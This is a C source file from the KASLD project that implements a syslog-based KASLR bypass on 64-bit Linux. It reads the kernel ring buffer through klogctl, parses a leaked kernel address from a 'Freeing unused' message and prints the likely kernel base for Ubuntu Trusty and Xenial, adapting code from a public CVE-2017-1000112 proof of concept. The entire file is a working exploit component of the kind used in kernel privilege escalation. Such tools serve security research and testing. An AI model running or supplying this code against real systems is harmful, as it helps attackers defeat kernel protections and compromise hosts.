// This file is part of KASLD - https://github.com/bcoles/kasld
// syslog KASLR bypass
// Requires kernel.dmesg_restrict = 0 (Default on Ubuntu systems); or CAP_SYSLOG capabilities.
// - https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/
// Mostly taken from original code by xairy:
// - https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c

#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/utsname.h>

// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;

struct utsname get_kernel_version() {
  struct utsname u;
  if (uname(&u) != 0) {
    printf("[-] uname(): %m\n");
    exit(1);
  }
  return u;
}

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

int mmap_syslog(char** buffer, int* size) {
  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
    return 1;
  }

  *size = (*size / getpagesize() + 1) * getpagesize();
  *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\n");
    return 1;
  }

  return 0;
}

unsigned long get_kernel_addr_syslog() {
  char* syslog;
  int size;

  if (mmap_syslog(&syslog, &size))
    return 0;

  const char* needle1 = "Freeing unused";
  char* substr = (char*)memmem(&syslog[0], size, needle1, strlen(needle1));
  if (substr == NULL)
    return 0;

  int start = 0;
  int end = 0;
  for (start = 0; substr[start] != '-'; start++);
  for (end = start; substr[end] != '\n'; end++);

  const char* needle2 = "ffffff";
  substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));

  if (substr == NULL)
    return 0;

  char* endptr = &substr[16];
  unsigned long addr = strtoul(&substr[0], &endptr, 16);

  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main (int argc, char **argv) {
  printf("[.] trying syslog ...\n");

  struct utsname u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    printf("[-] unsupported: system is not 64-bit.\n");
    exit(1);
  }

  unsigned long addr = get_kernel_addr_syslog();
  if (!addr) return 1;

  printf("leaked address: %lx\n", addr);

  /* ubuntu trusty */
  printf("kernel base (likely): %lx\n", addr & 0xffffffffff000000ul);

  /* ubuntu xenial */
  printf("kernel base (likely): %lx\n", (addr & 0xfffffffffff00000ul) - 0x1000000ul);

  return 0;
}

